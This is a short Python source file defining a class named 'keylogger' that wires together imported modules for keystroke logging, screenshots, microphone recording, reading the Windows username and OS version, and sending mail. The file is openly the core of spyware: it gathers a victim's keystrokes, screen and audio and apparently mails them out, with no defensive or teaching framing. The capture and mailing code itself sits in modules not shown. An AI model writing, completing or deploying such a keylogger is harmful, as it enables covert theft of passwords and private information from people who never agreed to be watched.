from mail import mail_time
from screenshoot import screenshootfunc
import os
import sys
from sound import sound_go
from keystroke import main
class keylogger():
    def screenshootgo(self):
        screenshootfunc()
    def system_name_go(self):
        return os.environ["USERNAME"]
    def sys_info(self):
        return sys.getwindowsversion()
    def take_sound(self):
        sound_go()
    def log_time(self):
        main()
    def mailsend(self):
        mail_time()